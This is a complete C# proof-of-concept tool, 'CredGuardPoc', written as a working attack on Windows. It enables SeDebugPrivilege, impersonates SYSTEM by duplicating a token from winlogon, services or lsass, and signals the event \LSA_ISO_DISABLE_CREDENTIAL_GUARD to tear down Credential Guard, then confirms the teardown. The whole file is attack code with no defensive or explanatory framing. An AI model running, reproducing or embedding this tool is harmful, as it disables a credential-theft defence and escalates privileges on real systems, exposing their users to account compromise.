using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CredGuardPoc
{
    internal static class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        private struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct OBJECT_ATTRIBUTES
        {
            public uint Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        private const uint TOKEN_ADJUST_PRIVILEGES  = 0x0020;
        private const uint TOKEN_QUERY              = 0x0008;
        private const uint TOKEN_DUPLICATE          = 0x0002;
        private const uint TOKEN_ALL_ACCESS         = 0xF01FF;
        private const uint SE_PRIVILEGE_ENABLED     = 0x00000002;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint EVENT_MODIFY_STATE       = 0x0002;
        private const uint OBJ_CASE_INSENSITIVE     = 0x00000040;

        private const uint STATUS_SUCCESS               = 0x00000000;
        private const uint STATUS_OBJECT_NAME_NOT_FOUND = 0xC0000034;
        private const uint STATUS_ACCESS_DENIED         = 0xC0000022;

        private enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        private enum TOKEN_TYPE { TokenPrimary = 1, TokenImpersonation = 2 }

        private enum TeardownResult
        {
            Disabled,
            AlreadyOff,
            Failed,
            Timeout,
            NoRights
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool LookupPrivilegeValueW(string systemName, string name, out LUID luid);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool AdjustTokenPrivileges(IntPtr tokenHandle, bool disableAllPrivileges,
            ref TOKEN_PRIVILEGES newState, uint bufferLength, IntPtr previousState, IntPtr returnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(IntPtr existingToken, uint desiredAccess,
            IntPtr tokenAttributes, SECURITY_IMPERSONATION_LEVEL impersonationLevel,
            TOKEN_TYPE tokenType, out IntPtr newToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ImpersonateLoggedOnUser(IntPtr token);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool RevertToSelf();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll")]
        private static extern int NtOpenEvent(out IntPtr handle, uint access, ref OBJECT_ATTRIBUTES oa);

        [DllImport("ntdll.dll")]
        private static extern int NtSetEvent(IntPtr handle, out uint previousState);

        [DllImport("ntdll.dll")]
        private static extern void RtlInitUnicodeString(ref UNICODE_STRING destination,
            [MarshalAs(UnmanagedType.LPWStr)] string source);

        private static void Log(string msg) { Console.WriteLine(msg); }

        private static bool EnableDebugPrivilege()
        {
            IntPtr hTok;
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hTok))
                return false;
            try
            {
                LUID luid;
                if (!LookupPrivilegeValueW(null, "SeDebugPrivilege", out luid))
                    return false;

                var tp = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Privileges = new[]
                    {
                        new LUID_AND_ATTRIBUTES { Luid = luid, Attributes = SE_PRIVILEGE_ENABLED }
                    }
                };
                bool ok = AdjustTokenPrivileges(hTok, false, ref tp,
                    (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                return ok && Marshal.GetLastWin32Error() == 0;
            }
            finally { CloseHandle(hTok); }
        }

        private static uint FindPid(string name)
        {
            foreach (var p in Process.GetProcessesByName(name))
            {
                try { return (uint)p.Id; } catch { }
            }
            return 0;
        }

        private static IntPtr ImpersonateSystem()
        {
            string[] candidates = { "winlogon", "services", "lsass" };
            foreach (var name in candidates)
            {
                uint pid = FindPid(name);
                if (pid == 0)
                {
                    Log("  [~] " + name + ".exe not found, trying next");
                    continue;
                }
                IntPtr hProc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
                if (hProc == IntPtr.Zero)
                {
                    Log("  [~] OpenProcess(" + name + ", " + pid + "): " + Marshal.GetLastWin32Error() + " - trying next");
                    continue;
                }
                try
                {
                    IntPtr hTok;
                    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, out hTok))
                    {
                        Log("  [~] OpenProcessToken(" + name + "): " + Marshal.GetLastWin32Error() + " - trying next");
                        continue;
                    }
                    try
                    {
                        IntPtr hDup;
                        if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, IntPtr.Zero,
                                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                TOKEN_TYPE.TokenImpersonation, out hDup))
                        {
                            Log("  [~] DuplicateTokenEx(" + name + "): " + Marshal.GetLastWin32Error() + " - trying next");
                            continue;
                        }
                        try
                        {
                            if (!ImpersonateLoggedOnUser(hDup))
                            {
                                Log("  [~] ImpersonateLoggedOnUser(" + name + "): " + Marshal.GetLastWin32Error() + " - trying next");
                                CloseHandle(hDup);
                                continue;
                            }
                            Log("  [+] Thread impersonating SYSTEM via " + name + ".exe (PID " + pid + ")");
                            return hDup;
                        }
                        catch { CloseHandle(hDup); throw; }
                    }
                    finally { CloseHandle(hTok); }
                }
                finally { CloseHandle(hProc); }
            }
            Log("  [!] All SYSTEM impersonation candidates exhausted: " + Marshal.GetLastWin32Error());
            return IntPtr.Zero;
        }

        private static int TryOpenCredGuardEvent(out IntPtr hEvent)
        {
            var us = new UNICODE_STRING();
            RtlInitUnicodeString(ref us, "\\LSA_ISO_DISABLE_CREDENTIAL_GUARD");

            IntPtr usBuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
            try
            {
                Marshal.StructureToPtr(us, usBuf, false);

                var oa = new OBJECT_ATTRIBUTES
                {
                    Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
                    ObjectName = usBuf,
                    Attributes = OBJ_CASE_INSENSITIVE
                };

                return NtOpenEvent(out hEvent, EVENT_MODIFY_STATE, ref oa);
            }
            finally
            {
                Marshal.FreeHGlobal(usBuf);
            }
        }

        private static TeardownResult SignalAndConfirmTeardown(int timeoutSec)
        {
            IntPtr hEvent;
            int st = TryOpenCredGuardEvent(out hEvent);

            if ((uint)st == STATUS_OBJECT_NAME_NOT_FOUND)
            {
                Log("  [~] Event not present before signal -> CredGuard was already off");
                return TeardownResult.AlreadyOff;
            }
            if (st != STATUS_SUCCESS)
            {
                Log("  [!] NtOpenEvent (pre) -> 0x" + ((uint)st).ToString("X8"));
                return TeardownResult.NoRights;
            }

            try
            {
                uint prev;
                int st2 = NtSetEvent(hEvent, out prev);
                if (st2 != STATUS_SUCCESS)
                {
                    Log("  [!] NtSetEvent -> 0x" + ((uint)st2).ToString("X8"));
                    return TeardownResult.Failed;
                }
                Log("  [+] NtSetEvent OK (prev=" + prev + "), polling for teardown...");
            }
            finally
            {
                CloseHandle(hEvent);
            }

            for (int i = 1; i <= timeoutSec; i++)
            {
                System.Threading.Thread.Sleep(1000);

                IntPtr hCheck;
                int stc = TryOpenCredGuardEvent(out hCheck);

                if ((uint)stc == STATUS_OBJECT_NAME_NOT_FOUND)
                {
                    Log("  [+] Confirmed: event gone after " + i + "s -> CredGuard torn down");
                    return TeardownResult.Disabled;
                }
                if (stc == STATUS_SUCCESS)
                {
                    Log("  [~] " + i + "s: event still present, waiting...");
                    CloseHandle(hCheck);
                    continue;
                }
                if ((uint)stc == STATUS_ACCESS_DENIED)
                {
                    Log("  [~] " + i + "s: ACCESS_DENIED (event still exists)");
                    continue;
                }
                Log("  [~] " + i + "s: NtOpenEvent -> 0x" + ((uint)stc).ToString("X8") + " (treating as still present)");
            }

            Log("  [!] Timeout: event still present after " + timeoutSec + "s");
            return TeardownResult.Timeout;
        }

        private static int Main(string[] args)
        {
            Log("=== CredGuardPoc.exe (Mono teardown-only, with precise confirmation) ===\n");

            Log("[Stage 0] Enable SeDebugPrivilege");
            if (!EnableDebugPrivilege())
                Log("  [!] SeDebugPrivilege failed (" + Marshal.GetLastWin32Error() + "); relying on current token");
            else
                Log("  [+] SeDebugPrivilege enabled");

            Log("\n[Stage 1] Impersonate SYSTEM");
            IntPtr hSystemToken = ImpersonateSystem();
            if (hSystemToken == IntPtr.Zero)
            {
                Log("  [!] Fatal: could not impersonate SYSTEM");
                return 1;
            }

            Log("\n[Stage 2] Signal + confirm teardown (max 10s)");
            TeardownResult result = SignalAndConfirmTeardown(10);

            Log("\n[Stage 3] Revert impersonation");
            RevertToSelf();
            CloseHandle(hSystemToken);
            Log("  [+] Reverted");

            Log("\n[Result] " + result);

            switch (result)
            {
                case TeardownResult.Disabled:   return 0;
                case TeardownResult.AlreadyOff: return 0;
                case TeardownResult.Timeout:    return 3;
                case TeardownResult.NoRights:   return 4;
                case TeardownResult.Failed:     return 5;
                default:                        return 99;
            }
        }
    }
}
